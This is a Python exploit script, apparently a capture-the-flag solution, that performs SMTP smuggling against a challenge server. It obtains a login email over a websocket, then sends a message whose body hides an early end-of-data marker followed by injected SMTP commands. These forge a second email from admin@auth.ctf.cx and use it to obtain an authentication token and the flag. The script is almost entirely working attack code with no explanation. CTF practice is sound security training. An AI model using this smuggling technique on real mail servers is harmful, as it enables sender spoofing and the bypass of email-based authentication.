from smtplib import SMTP
from email.mime.text import MIMEText
from dns import resolver
from websockets.sync.client import connect
import json
import requests

URL = 'https://chall.polygl0ts.ch:8025'

ws = connect(URL.replace('http', 'ws', 1) + '/ws/auth')
ws.send('{"action":"login"}')
res = json.loads(ws.recv())
dest_email = res['auth_email']
subject = res['subject']

mx_server = str(list(resolver.resolve('auth.ctf.cx', 'MX'))[0].exchange).rstrip('.')

content = "end of first message\r\n"
content += ".\r\n"  # end-of-data
content += "MAIL FROM:<admin@auth.ctf.cx>\r\n"
content += "RCPT TO:<magic@auth.ctf.cx>\r\n"
content += "DATA\r\n"
content += "Received: 1.3.3.7\r\n"
content += f"Subject: {subject}\r\n"
content += "\r\n"
content += "This is a smuggled email."
exploit_msg = MIMEText(content, 'plain')
exploit_msg['Subject'] = "Outer Message"

conn = SMTP(mx_server, 587)
conn.set_debuglevel(True)
conn.sendmail('outer_from@example.com', 'outer_to@example.com', exploit_msg.as_string())
conn.quit()

res = json.loads(ws.recv())
token = res['token']

print(requests.get(URL + '/api/flag', headers={'Authorization': f'Bearer {token}'}).json())
